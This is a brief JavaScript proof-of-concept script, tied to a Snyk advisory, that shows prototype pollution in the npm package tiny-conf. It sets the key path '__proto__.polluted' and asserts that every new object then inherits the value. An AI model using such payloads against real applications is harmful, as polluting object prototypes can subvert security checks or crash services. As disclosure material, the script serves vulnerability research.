//https://snyk.io/vuln/SNYK-JS-TINYCONF-598792
const tinyConf = require('tiny-conf'); 
const assert = require('assert');

var obj = {}
console.log("Before : " + obj.polluted);

tinyConf.set('__proto__.polluted', "yes"); 

console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");